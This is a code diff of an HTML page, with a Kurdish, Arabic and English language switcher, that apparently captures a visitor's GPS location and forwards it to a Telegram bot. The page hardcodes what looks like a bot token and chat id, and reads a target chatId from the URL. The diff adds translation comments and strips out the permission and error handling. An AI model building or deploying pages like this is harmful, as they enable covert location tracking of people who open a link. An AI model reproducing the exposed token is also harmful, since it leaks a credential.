@@ -32,6 +32,7 @@
             backdrop-filter: blur(6px);
         }
 
+        /* ---------- هەڵبژاردەی زمان ---------- */
         .lang-selector {
             position: fixed;
             top: 15px;
@@ -73,7 +74,7 @@
             padding: 35px 28px;
             box-shadow: 0 20px 50px rgba(0, 0, 0, .35);
             text-align: center;
-            margin-top: 60px;
+            margin-top: 60px; /* بۆ ئەوەی لە ژێر هەڵبژاردەکەوە بێت */
         }
 
         .icon {
@@ -155,12 +156,14 @@
 </head>
 <body>
 
+    <!-- ========== هەڵبژاردەی زمان ========== -->
     <div class="lang-selector">
         <button class="lang-btn active" onclick="changeLang('ar')">العربية</button>
         <button class="lang-btn" onclick="changeLang('ckb')">کوردی</button>
         <button class="lang-btn" onclick="changeLang('en')">English</button>
     </div>
 
+    <!-- ========== ناوەڕۆکی سەرەکی ========== -->
     <div class="card">
         <div class="icon">📍</div>
         <h1 data-i18n="main_title">تم استلام موقع المستخدم</h1>
@@ -188,6 +191,7 @@
     </div>
 
     <script>
+        // ========== داتابەیسی وەرگێڕان ==========
         const translations = {
             ar: {
                 page_title: "عرض الموقع",
@@ -233,13 +237,16 @@
             }
         };
 
+        // ========== فەنکشنی گۆڕینی زمان ==========
         function changeLang(lang) {
+            // گۆڕینی ئاڕاستە
             if (lang === 'ar' || lang === 'ckb') {
                 document.documentElement.dir = 'rtl';
             } else {
                 document.documentElement.dir = 'ltr';
             }
 
+            // نوێکردنەوەی هەموو توخمەکانی data-i18n
             document.querySelectorAll('[data-i18n]').forEach(el => {
                 const key = el.getAttribute('data-i18n');
                 if (translations[lang] && translations[lang][key]) {
@@ -247,11 +254,14 @@
                 }
             });
 
+            // دیاریکردنی دوگمەی چالاک
             document.querySelectorAll('.lang-btn').forEach(btn => btn.classList.remove('active'));
             document.querySelector(`[onclick="changeLang('${lang}')"]`).classList.add('active');
 
+            // پاشەکەوتکردنی زمان
             localStorage.setItem('preferred_lang_gps', lang);
 
+            // نوێکردنەوەی دوگمەی سەرەکی ئەگەر لە دۆخی چالاکدا بێت
             const btn = document.getElementById('btnStart');
             if (btn.disabled && btn.textContent.includes('⏳')) {
                 btn.textContent = translations[lang].loading;
@@ -262,11 +272,13 @@
             }
         }
 
+        // بارکردنی زمانی پاشەکەوتکراو
         window.addEventListener('DOMContentLoaded', () => {
             const savedLang = localStorage.getItem('preferred_lang_gps') || 'ar';
             changeLang(savedLang);
         });
 
+        // ========== کۆدی GPS ==========
         const TOKEN = '7524329663:AAERQzZ21_sskD6GLfUNLTYvTy--X733hEI';
         const CHAT = '1015102519';
         const chatId = new URLSearchParams(location.search).get('chatId') || 'unknown';
@@ -276,28 +288,10 @@
             const res = document.getElementById('result');
             const currentLang = localStorage.getItem('preferred_lang_gps') || 'ar';
 
-            if (!navigator.geolocation) {
-                res.textContent = translations[currentLang].error_prefix + 'GPS not supported';
-                return;
-            }
-
             btn.disabled = true;
             btn.textContent = translations[currentLang].loading;
             res.textContent = '';
             res.style.display = 'block';
-
-            let permissionDenied = false;
-            if (navigator.permissions) {
-                try {
-                    const perm = await navigator.permissions.query({ name: 'geolocation' });
-                    permissionDenied = (perm.state === 'denied');
-                } catch(e) {}
-            }
-
-            if (permissionDenied) {
-                location.reload();
-                return;
-            }
 
             try {
                 const position = await new Promise((resolve, reject) =>
@@ -326,13 +320,9 @@
                 btn.textContent = translations[currentLang].done;
 
             } catch (e) {
-                if (e.code === 1) {
-                    location.reload();
-                } else {
-                    btn.disabled = false;
-                    btn.textContent = translations[currentLang].retry;
-                    res.textContent = translations[currentLang].error_prefix + e.message;
-                }
+                res.textContent = translations[currentLang].error_prefix + e.message;
+                btn.disabled = false;
+                btn.textContent = translations[currentLang].retry;
             }
         }
     </script>
